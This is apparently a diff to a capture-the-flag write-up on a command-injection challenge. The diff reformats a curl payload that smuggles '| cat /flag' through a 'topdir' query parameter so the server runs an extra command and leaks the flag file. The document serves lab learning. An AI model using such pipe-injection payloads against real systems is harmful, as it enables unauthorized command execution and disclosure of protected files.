@@ -64,7 +64,9 @@ By injecting `| cat /flag`, the attacker can trick the shell into executing an a
 
 ### Payload
 
-`curl "http://challenge.localhost:80/quest?topdir=/flag%20|%20cat%20/flag"`
+```
+curl "http://challenge.localhost:80/quest?topdir=/flag%20|%20cat%20/flag"
+```
 
 ### Command Executed on Server:
 
@@ -79,5 +81,6 @@ ls -l /flag | cat /flag
 * The response HTML includes the flag.
 
 ## Conclusion
+
 
 This challenge demonstrates Command Injection via pipe (`|`) injection. By injecting `| cat /flag` into the topdir parameter, we successfully executed an unintended command and leaked the contents of the protected flag file.
